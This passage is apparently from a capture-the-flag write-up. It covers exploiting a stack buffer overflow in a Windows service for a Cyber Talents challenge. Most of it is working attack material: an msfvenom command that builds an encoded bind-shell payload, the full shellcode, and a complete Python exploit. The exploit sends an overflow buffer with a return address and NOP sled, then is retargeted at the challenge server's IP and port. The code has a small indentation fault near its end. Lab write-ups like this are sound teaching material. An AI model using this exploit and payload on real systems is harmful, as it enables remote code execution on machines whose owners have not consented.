╰─~ msfvenom -p windows/shell_bind_tcp LPORT=7080 EXITFUNC=thread -b '\x00' -e x86/shikata_ga_nai -f py -v shellcode                                                                                                                130 ↵  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
[-] No arch selected, selecting arch: x86 from the payload  
Found 1 compatible encoders  
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai  
x86/shikata_ga_nai succeeded with size 355 (iteration=0)  
x86/shikata_ga_nai chosen with final size 355  
Payload size: 355 bytes  
Final size of py file: 1998 bytes  
shellcode =  b""  
shellcode += b"\xb8\x9f\x06\xbc\xb1\xdb\xd3\xd9\x74\x24\xf4"  
shellcode += b"\x5e\x33\xc9\xb1\x53\x83\xc6\x04\x31\x46\x0e"  
shellcode += b"\x03\xd9\x08\x5e\x44\x19\xfc\x1c\xa7\xe1\xfd"  
shellcode += b"\x40\x21\x04\xcc\x40\x55\x4d\x7f\x71\x1d\x03"  
shellcode += b"\x8c\xfa\x73\xb7\x07\x8e\x5b\xb8\xa0\x25\xba"  
shellcode += b"\xf7\x31\x15\xfe\x96\xb1\x64\xd3\x78\x8b\xa6"  
shellcode += b"\x26\x79\xcc\xdb\xcb\x2b\x85\x90\x7e\xdb\xa2"  
shellcode += b"\xed\x42\x50\xf8\xe0\xc2\x85\x49\x02\xe2\x18"  
shellcode += b"\xc1\x5d\x24\x9b\x06\xd6\x6d\x83\x4b\xd3\x24"  
shellcode += b"\x38\xbf\xaf\xb6\xe8\xf1\x50\x14\xd5\x3d\xa3"  
shellcode += b"\x64\x12\xf9\x5c\x13\x6a\xf9\xe1\x24\xa9\x83"  
shellcode += b"\x3d\xa0\x29\x23\xb5\x12\x95\xd5\x1a\xc4\x5e"  
shellcode += b"\xd9\xd7\x82\x38\xfe\xe6\x47\x33\xfa\x63\x66"  
shellcode += b"\x93\x8a\x30\x4d\x37\xd6\xe3\xec\x6e\xb2\x42"  
shellcode += b"\x10\x70\x1d\x3a\xb4\xfb\xb0\x2f\xc5\xa6\xdc"  
shellcode += b"\x9c\xe4\x58\x1d\x8b\x7f\x2b\x2f\x14\xd4\xa3"  
shellcode += b"\x03\xdd\xf2\x34\x63\xf4\x43\xaa\x9a\xf7\xb3"  
shellcode += b"\xe3\x58\xa3\xe3\x9b\x49\xcc\x6f\x5b\x75\x19"  
shellcode += b"\x05\x53\xd0\xf2\x38\x9e\xa2\xa2\xfc\x30\x4b"  
shellcode += b"\xa9\xf2\x6f\x6b\xd2\xd8\x18\x04\x2f\xe3\x3d"  
shellcode += b"\x7d\xa6\x05\x2b\x6d\xef\x9e\xc3\x4f\xd4\x16"  
shellcode += b"\x74\xaf\x3e\x0f\x12\xf8\x28\x88\x1d\xf9\x7e"  
shellcode += b"\xbe\x89\x72\x6d\x7a\xa8\x84\xb8\x2a\xbd\x13"  
shellcode += b"\x36\xbb\x8c\x82\x47\x96\x66\x26\xd5\x7d\x76"  
shellcode += b"\x21\xc6\x29\x21\x66\x38\x20\xa7\x9a\x63\x9a"  
shellcode += b"\xd5\x66\xf5\xe5\x5d\xbd\xc6\xe8\x5c\x30\x72"  
shellcode += b"\xcf\x4e\x8c\x7b\x4b\x3a\x40\x2a\x05\x94\x26"  
shellcode += b"\x84\xe7\x4e\xf1\x7b\xae\x06\x84\xb7\x71\x50"  
shellcode += b"\x89\x9d\x07\xbc\x38\x48\x5e\xc3\xf5\x1c\x56"  
shellcode += b"\xbc\xeb\xbc\x99\x17\xa8\xdd\x7b\xbd\xc5\x75"  
shellcode += b"\x22\x54\x64\x18\xd5\x83\xab\x25\x56\x21\x54"  
shellcode += b"\xd2\x46\x40\x51\x9e\xc0\xb9\x2b\x8f\xa4\xbd"  
shellcode += b"\x98\xb0\xec"
```

---
### Gaining access 


```python
#!/usr/bin/env python3

import socket

ip = '192.168.1.4' # change it
port = 13337 # change it

command = "SECRET "
offset = 997
overflow = "A" * offset

# bad chars -> \x00
# jmp esp -> \x62\x50\x12\xa0

retn = "\xa0\x12\x50\x62" # make sure to type the return address from the right to left because we are using little-endian

padding = "\x90" * 50

shellcode = ""
shellcode += "\xb8\x9f\x06\xbc\xb1\xdb\xd3\xd9\x74\x24\xf4"
shellcode += "\x5e\x33\xc9\xb1\x53\x83\xc6\x04\x31\x46\x0e"
shellcode += "\x03\xd9\x08\x5e\x44\x19\xfc\x1c\xa7\xe1\xfd"
shellcode += "\x40\x21\x04\xcc\x40\x55\x4d\x7f\x71\x1d\x03"
shellcode += "\x8c\xfa\x73\xb7\x07\x8e\x5b\xb8\xa0\x25\xba"
shellcode += "\xf7\x31\x15\xfe\x96\xb1\x64\xd3\x78\x8b\xa6"
shellcode += "\x26\x79\xcc\xdb\xcb\x2b\x85\x90\x7e\xdb\xa2"
shellcode += "\xed\x42\x50\xf8\xe0\xc2\x85\x49\x02\xe2\x18"
shellcode += "\xc1\x5d\x24\x9b\x06\xd6\x6d\x83\x4b\xd3\x24"
shellcode += "\x38\xbf\xaf\xb6\xe8\xf1\x50\x14\xd5\x3d\xa3"
shellcode += "\x64\x12\xf9\x5c\x13\x6a\xf9\xe1\x24\xa9\x83"
shellcode += "\x3d\xa0\x29\x23\xb5\x12\x95\xd5\x1a\xc4\x5e"
shellcode += "\xd9\xd7\x82\x38\xfe\xe6\x47\x33\xfa\x63\x66"
shellcode += "\x93\x8a\x30\x4d\x37\xd6\xe3\xec\x6e\xb2\x42"
shellcode += "\x10\x70\x1d\x3a\xb4\xfb\xb0\x2f\xc5\xa6\xdc"
shellcode += "\x9c\xe4\x58\x1d\x8b\x7f\x2b\x2f\x14\xd4\xa3"
shellcode += "\x03\xdd\xf2\x34\x63\xf4\x43\xaa\x9a\xf7\xb3"
shellcode += "\xe3\x58\xa3\xe3\x9b\x49\xcc\x6f\x5b\x75\x19"
shellcode += "\x05\x53\xd0\xf2\x38\x9e\xa2\xa2\xfc\x30\x4b"
shellcode += "\xa9\xf2\x6f\x6b\xd2\xd8\x18\x04\x2f\xe3\x3d"
shellcode += "\x7d\xa6\x05\x2b\x6d\xef\x9e\xc3\x4f\xd4\x16"
shellcode += "\x74\xaf\x3e\x0f\x12\xf8\x28\x88\x1d\xf9\x7e"
shellcode += "\xbe\x89\x72\x6d\x7a\xa8\x84\xb8\x2a\xbd\x13"
shellcode += "\x36\xbb\x8c\x82\x47\x96\x66\x26\xd5\x7d\x76"
shellcode += "\x21\xc6\x29\x21\x66\x38\x20\xa7\x9a\x63\x9a"
shellcode += "\xd5\x66\xf5\xe5\x5d\xbd\xc6\xe8\x5c\x30\x72"
shellcode += "\xcf\x4e\x8c\x7b\x4b\x3a\x40\x2a\x05\x94\x26"
shellcode += "\x84\xe7\x4e\xf1\x7b\xae\x06\x84\xb7\x71\x50"
shellcode += "\x89\x9d\x07\xbc\x38\x48\x5e\xc3\xf5\x1c\x56"
shellcode += "\xbc\xeb\xbc\x99\x17\xa8\xdd\x7b\xbd\xc5\x75"
shellcode += "\x22\x54\x64\x18\xd5\x83\xab\x25\x56\x21\x54"
shellcode += "\xd2\x46\x40\x51\x9e\xc0\xb9\x2b\x8f\xa4\xbd"
shellcode += "\x98\xb0\xec"

postfix = '\x90' * 50

buffer = command + overflow + retn + padding + shellcode + postfix
  
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	
	except:
		print("Could not connect.")
```

![/assets/images/crashed/exploit_win7.png](/assets/images/crashed/exploit_win7.png)

---
## Exploit Challenge server 
- we need to :
	- change `ip` variable in python script to send it to Cyber Talents challenge machine
		- `ip = '3.123.39.113'`
	- check if it's the same listening port
		- after checking we found 
		
		![listening port](/assets/images/crashed/listening_port.png)
		- `port = 1887 ` change the port number in `exploit.py` 
![get_flag.png](/assets/images/crashed/get_flag.png)

---
